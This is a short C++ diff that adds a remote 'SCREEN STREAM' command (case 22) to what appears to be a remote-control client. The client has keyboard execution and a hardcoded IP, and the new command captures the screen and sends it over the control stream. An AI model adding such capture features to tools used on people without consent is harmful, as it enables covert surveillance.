@@ -17,6 +17,7 @@
 #include "keyboard/KeyboardExecuter.h"
 #include "permission/Permission.h"
 #include "box_message/MessageBoxGUI.h"
+#include "screen/ScreenStreamer.h"
 
 #define IP "192.168.1.133"
 
@@ -278,6 +279,12 @@ int main() {
                             MessageBoxGUI messageBox(boxInformation);
                             std::thread messageBoxThread(&MessageBoxGUI::showMessageGUI, &messageBox);
                             messageBoxThread.detach();
+                            break;
+                        }
+                        case 22: {
+                            std::cout << "SCREEN STREAM" << std::endl;
+                            ScreenStreamer screenStreamer(stream);
+                            screenStreamer.sendPicture();
                             break;
                         }
                         default: {
